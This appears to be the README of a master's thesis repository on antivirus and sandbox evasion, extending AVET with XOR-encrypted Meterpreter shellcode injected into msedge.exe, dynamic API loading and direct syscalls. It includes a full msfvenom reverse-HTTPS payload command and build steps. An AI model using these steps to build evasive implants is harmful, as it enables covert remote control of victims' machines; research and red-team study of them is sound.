# Repository Overview

This repository hosts the implementation of Ayoub's Master Thesis, which explores Malware Obfuscation and Evasion Techniques. The primary focus is on developing methods to bypass the CAPEv2 sandbox.

The repository also enhances the AntiVirus Evasion Tool (AVET) with several notable improvements:

- Introduction of a script to build a **stageless** Meterpreter for performing a shellcode injections.
- Development of a shellcode injection method that identifies the **target process by name**, automatically determining the PID. This approach is more suitable for Red Teaming scenarios than the original AVET method, which required a *PID to be specified at the command line*.
- Addition of advanced shellcode injection techniques that use **dynamic API loading**.
- Implementation of a version that use **dynamic loading of NTAPIs**.
- Addition of a version that use **direct syscall**.
- Fixed a bug in the `static_from_here` function. Previously, this function included and called `static_from_file`. However, due to the use of `#pragma once`, macros defined specifically for `static_from_here` were not available in the scope of `static_from_file` if `static_from_file` was included before its invocation by `static_from_here`.

Furthermore, the repository includes a custom xor encoder designed to enhance evasion capabilities, addressing the limitations of the existing AVET encoder that fails to hide the payload against AVs statically.

## Author

BOUHNINE Ayoub

## Repository Structure

The repository is organized as follows:

- **Custom Payloads:** Contains various custom payloads.
- **AVET Folder:** Hosts the AVET (AntiVirus Evasion Tool).
- **SysWhispers3 Folder:** Used for generating (or possibly statically embedding different payloads within AVET).

## Research Paper

The accompanying thesis paper is available for download in the [paper folder](./paper/thesis.pdf).

## Installing AVET

__The Installtion Instruction applies for Kali 64bit and tdm-gcc!__

You can use the setup script:
```bash
./setup.sh
```

This should automatically get you started by installing/configuring wine and installing tdm-gcc.
You'll shortly have to click through the tdm-gcc installer GUI though - standard settings should be fine.
The script will also ask if you want to install AVET's dependencies, which are needed to use some of the build scripts. The fetched dependencies will be put into separate folders next to the avet folder.


Dependencies will grab the latest releases of:
- [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)
- [mimikatz](https://github.com/gentilkiwi/mimikatz)
- [DKMC](https://github.com/Mr-Un1k0d3r/DKMC)


If for whatever reason you want to install wine and tdm-gcc manually:
- [How to install tdm-gcc with wine](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)

## Evasion Techniques

The samples, available on the directory `samples/` included in this repository use several evasion techniques:

- **Obfuscation:** A stageless Meterpreter x64 reverse HTTPS payload that employs a basic XOR encryption is used. This technique is implemented in all the samples.
- **Shellcode Injection:** an injection of the Meterpreter payload is performed into **msedge.exe**, this could fool security solutions since Microsoft Edge regularly perform HTTPS request, therefore the Meterpreter traffic will be hidden with the regular Ms Edge traffic. This is implemented in all the samples.
- **Basic API calls:** This is not an evasion tehcniques however, the sample implemeting this will serve as a baseline for other sample. This is implemented in the sample `Shellcode_injection`.
- **Dynamic API Loading:** This is a basic method used to hide the APIs from the Import Address Table. This will resolve the APIs by loading them dynamically. This is implemented in the sample `Shellcode_injection_dynamic_lib`.
- **NTAPIs:** This is a more advances tehcniques where we load the NTAPIs instead of the classical APIs dynamically. This could potentially bypass security solutions that does not hook the `ntdll.dll`. This is implemented in the sample `Shellcode_injection_NTAPIs`.
- **Evasion of API Hooks by Direct Syscalls:** This tehcniqeus is used to bypass the API hooking of classical APIs and NTAPIs by using a Direct Syscalls technique. This is implemented in the sample `Shellcode_injection_syscalls`

These techniques have been integrated by the author within the AVET framework available on this repo. For syscall generation, the tool **SysWhispers3** is used, available at: [SysWhispers3 on GitHub](https://github.com/klezVirus/SysWhispers3).

## Modification of the payload

The payload used is stageless Meterpreter x64 reverse HTTPS payload that employs a basic XOR encryption is used. This has to be replaced if you want to use your payload with the right IP address.

## Utils

### XORing Meterpreter payloads

For xoring the payload we used the code available on `XOR_encryptor`.

To do so:
- Generate your payload using **msfvenom** : `msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.173.130 lport=443 -f c > payload.h`
- Take the file newly generated and give it as input to the executable `XOR_encryptor.exe`, this can be used with the following command : `.\XOR_encryptor.exe payload.h <output_file_name>` for example in our case the output filename is `buffer.h `
- Add the newly generated file into Visual Studio. Then include the file into the sample of your choice.
You should be ready to go !

In a kali machine, ensure you have `wine` installed, then you have to simply execute the command with `wine` as a prefix and you should have your XORed payload generated.

### For generating direct syscalls using Syswhisper3

In a Visual Studio Setup:

- move to the `syswhispers` directory
- `python.exe syswhispers.py --function NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o output/syscall`
- Copy the generated H/C/ASM files into the project folder.
- In Visual Studio, go to Project → Build Customizations... and enable MASM.
- In the Solution Explorer, add the .h and .c/.asm files to the project as header and source files, respectively.
- Go to the properties of the ASM file, and set the Item Type to Microsoft Macro Assembler.
- Compile it

You should be ready to go !

Don't forget to properly call the functions generated `Sw3...()`

Sometimes some adjustement is needed to properly compile the project, make sure they are no redefinition of the same structures. The samples I provided are fully working  (they compile without any issue)

## Extension of AVET

This section outlines the scripts and files that have been added:

**In the `build/` directory:**
- `build_injectshc_xor_revhttps_stageless_win64.sh` ... [details here]

**In the `source/implementations/payload_execution_method` directory:**
- `inject_shellcode_procname.h` ... [details here]

**Note:**
- The `static_from_here.h` script from `source/implementations/retrieve_data/` has been modified to address the bug fix detailed earlier.